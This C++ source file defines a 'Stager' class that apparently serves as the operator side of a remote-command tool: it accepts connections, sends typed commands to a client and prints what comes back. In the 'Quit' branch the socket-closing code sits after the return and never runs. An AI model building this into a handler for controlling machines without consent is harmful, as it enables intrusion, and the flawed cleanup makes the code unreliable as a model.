#include "Stager.h"

void Stager::OnConnect(Connection newConnection)
{
    std::cout << "[+] Accepted new connection: [ ip: " << newConnection.GetIp() << ", port: " << newConnection.GetPort() << "]" << std::endl;

    Packet packet;
    newConnection.Recv(packet);

    int packetSize = packet.PacketSize();

    while (packet.GetPacketOffset() < packetSize)
        std::cout << packet.ExtractString();
}

bool Stager::Logic(const std::string& command)
{
    Packet packet;

    if (command == "Quit")
    {
        return false;
        connSocket.Close();
        clientConn.Close();
    }
    else
    {
        packet.InsertString(command);

        if (not clientConn.Send(packet))
        {
            connSocket.Close();
            clientConn.Close();
            return false;
        }
        if (not clientConn.Recv(packet))
        {
            connSocket.Close();
            clientConn.Close();
            return false;
        }

        uint32_t packetSize = packet.PacketSize();
        std::cout << packet.ExtractString().erase(0, command.size() + 1);
    }

	return true;
}
